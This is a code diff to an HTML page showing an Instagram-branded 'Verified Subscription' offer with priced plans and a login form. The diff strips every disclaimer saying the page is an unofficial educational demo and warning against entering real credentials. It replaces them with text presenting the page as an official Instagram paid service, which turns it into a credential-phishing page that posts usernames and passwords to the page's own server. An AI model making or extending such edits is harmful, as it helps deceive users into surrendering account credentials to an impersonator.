@@ -4,7 +4,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Verified Subscription Demo</title>
+<title>Verified Subscription </title>
 <style>
 * { box-sizing: border-box; }
 body {
@@ -59,41 +59,41 @@ button {
 <body>
 <main class="card">
   <div class="logo">Instagram <span class="tick">✓</span></div>
-  <h2>Verified Subscription Demo</h2>
+  <h2>Verified Subscription </h2>
 
   <p>
-    Independent educational demo.
-    This is not an official Instagram service.
+    instagram paid service.
+    here you can choose the plan.
   </p>
 
   <div class="plan">
-    <b>Monthly Demo Plan</b>
+    <b>Monthly Plan</b>
     <div class="price">₹99 / month</div>
   </div>
 
   <div class="plan">
-    <b>Yearly Demo Plan</b>
+    <b>Yearly Plan</b>
     <div class="price">₹999 / year</div>
   </div>
 
-  <h3>Demo Login</h3>
+  <h3> Login</h3>
 
   <form id="loginForm">
     <input id="username"
-      placeholder="Demo username"
+      placeholder="username"
       autocomplete="off" required>
 
     <input id="demoCode"
-      placeholder="Demo access code"
+      placeholder=" access code"
       type="password" required>
 
-    <button type="submit">Try Demo Login</button>
+    <button type="submit"> Login</button>
   </form>
 
   <p id="message"></p>
 
   <p class="note">
-    Demo credentials only. Do not enter real Instagram credentials.
+    do no enter wrong credentials.
   </p>
 </main>
 
@@ -104,7 +104,7 @@ const message = document.getElementById("message");
 form.addEventListener("submit", async (event) => {
   event.preventDefault();
 
-  message.textContent = "Checking demo...";
+  message.textContent = "Checking ...";
 
   try {
     const response = await fetch("/demo-login", {
@@ -114,7 +114,7 @@ form.addEventListener("submit", async (event) => {
       },
       body: JSON.stringify({
         username: document.getElementById("username").value,
-        demo_code: document.getElementById("demoCode").value
+        demo_code: document.getElementById("Code").value
       })
     });
 
@@ -126,7 +126,7 @@ form.addEventListener("submit", async (event) => {
     document.getElementById("demoCode").value = "";
 
   } catch (error) {
-    message.textContent = "Unable to connect to demo server.";
+    message.textContent = "Unable to connect to server.";
   }
 });
 </script>
